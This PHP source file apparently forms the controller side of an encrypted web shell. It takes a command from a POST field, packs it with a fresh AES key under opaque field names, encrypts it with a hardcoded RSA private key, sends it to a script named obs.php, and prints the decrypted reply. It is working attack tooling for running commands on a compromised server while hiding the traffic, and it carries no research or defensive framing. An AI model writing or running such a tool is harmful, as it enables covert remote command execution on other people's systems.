<?php
class Rsa {
    private static $PRIVATE_KEY = '-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCXQiAWvP44cmfT
EEuz5nwDy1HBK/sDE0kJrjf+NFtw7tyOA/aObRYfbJi6FUVfTXUBRg4TyKPOH9Ul
5rhg9E/nK6RM0kLi3hwO90aDgAv7o28aKkwYNYNoTL+1PtFMMFfIyn4ltV53iemj
cDBbkfA4NsXv5/04J0GUVhgs5p+xg3R+TYAPfZGa2B6SQImu835EFRIKKhQs+bQj
lRgnbHZTYMfVC3w2Db5dpw++F7MJdYi9wR/ba0hK/NBoGz6u3OhI0U0xCvfX8Llb
mJU2Zy/OFqZdLGTbQ16Z8eBt3fe+RK9B5UJMSF5XY2nngaN9y0tZk3P24qQ2ANpR
yi/nyNvbAgMBAAECggEAAeDjQO6jVTRUH/XPJhKCAZJ08MPo9jtQyDF+zLkXiToC
/DKGM9oDKp9XI2x5mmFKx2bFOWKsm7YFsb0a47COpq2bxaZ3O5XYxFwDmkUTVDjN
4h9nWlLQnHfjigH+aGzrRV+aaUGs3pAuAIa3dKB5DfTdyKJzBxwzS/8CH6cHka7h
QtSwhidpDL+4qvYSkYrYgkZ+M+1br41OTZN7P4PQouP9IfLCl8bLlFPrgyVXTEqN
b3Fbq8zdcf4Y6oBhMfmnD4Gj5VELuyL4Ui4900nG78upn0Gt6l25rkgm29tyInrq
ylr6E+dDNZTB7Qn4bfNMW2bawtcODRvVhOjHoFeQ0QKBgQC+O8aJwcMblDvLsDag
ytR+hQYe9oK6K2DBQMu8hbetpyOzStS5oAzcfReCmVSg743eOxSg9dzJYBtSlxOD
GJ0WwCS5NPAfJODuGQ1WmH5Oeb7JSh3DoJsglZQtrrV/DkfFecivR5Quz15jVn1H
HyeUCuTfjRtReMi7CeffoDeQcQKBgQDLjO4kz0ZFSSTToKpoVgJ8a90CGu6G2xHO
qDmbm/Y49cTbkOJjjawI302EkUqO/i20Y2k+ZhBygbfoQWo29jLpS07gnnx2kfDb
aT5Ww4b9NLODdRjkdl/ibBbiNQtZGZesdL0aPkBGiqQFV0UB9z4+ptercFjslvHo
whzWW+OXCwKBgQCHS1gOjWHH8Yr9eJvBi7/JI66Qwt2Crmsnxn+f2rIhrOd1Ells
k2nSPp1D4u0PcJBDZ11qhLG7/sAv4wabjBvdHFaB6iaE3+OhMuwLlHTwNyH7Ytz8
TvNFH1y9iK3IaU2eItkZ4ByBljYZDGAY/w1U+tKAM4kkTnTkoUzp/LbH4QKBgGW6
76Jx/VrPbZpfKAuxQNjSR8ivkRrRDhtMtE3zKqHZIyPhS2QaACsG/4UL4EmK+2i2
bnkDJaE096caWm1RqqwyOR/F1cqksc3W0ZMncaXG2xkOQvybtNxCzUUM4bkMM2O7
jG87QYB/9e29af3Lhc5mME+8fJTx88EykpsHnb11AoGAZNdpn8/OZHDrFxgf7Kc2
g5QrhO6YN/MQHFpp2IPuTDJgQ+mkD1OScNm3P4Jf/uYXiukhg9OAyRXcN01JpDog
FMkyWGAnaz0/cwvK+Ey+sq2Qn9OwZj9zKfpNrLYHYbLJHdRVTyDa/k712Y5+YRUU
iy56B34vzkt2Ib2ETCXgMCQ=
-----END PRIVATE KEY-----';
    private  $encryptBlockSize = 245;

    private static function getPrivateKey()
    {
        $privKey = self::$PRIVATE_KEY;
        return openssl_pkey_get_private($privKey);
    }

    public function privEncrypt($data)
    {
        if (!is_string($data))
        {
            return null;
        }

        //私钥分段加密
        $result='';
        $data = str_split($data, $this->encryptBlockSize);
        foreach ($data as $block) {
            openssl_private_encrypt($block, $encrypted, self::getPrivateKey());
            $result .= $encrypted;
        }
        return $result ? base64_encode($result) : null;

    }
}

class AES{
    var $AES_KEY;

    function __construct(){
        $this->AES_KEY = $this->uuid();
    }
    function  uuid()
    {
        $chars = md5(uniqid(mt_rand(), true));
        $uuid = substr ( $chars, 0, 8 ) . '-'
            . substr ( $chars, 8, 4 ) . '-'
            . substr ( $chars, 12, 4 ) . '-'
            . substr ( $chars, 16, 4 ) . '-'
            . substr ( $chars, 20, 12 );
        return $uuid ;
    }



    public  function decryptAES($data)
    {

        if (!is_string($data)) {
            return null;
        }
        $decrypt = openssl_decrypt($data, 'AES-128-ECB', $this->AES_KEY, 0);
        return $decrypt;
    }
    public function returnAesKey(){
        return $this->AES_KEY;
    }
}








if(isset($_POST['cmd'])){
    $rsa = new Rsa();
    $aes = new AES();

    $PAYLOAD = json_encode(array("46d29d717ff140f88188ce92cc45d497"=>$_POST['cmd'], "bcb408560553405e8064f3bd16ebfae1"=>$aes->returnAesKey()));
    $Encrypt = $rsa->privEncrypt($PAYLOAD);


    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'http://localhost/obs.php',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => array('f88a1636b885442c9debb25e2399eaa3' => $Encrypt),
    ));

    $response = curl_exec($curl);
    curl_close($curl);
    $response = $aes->decryptAES($response);
    echo $response;
}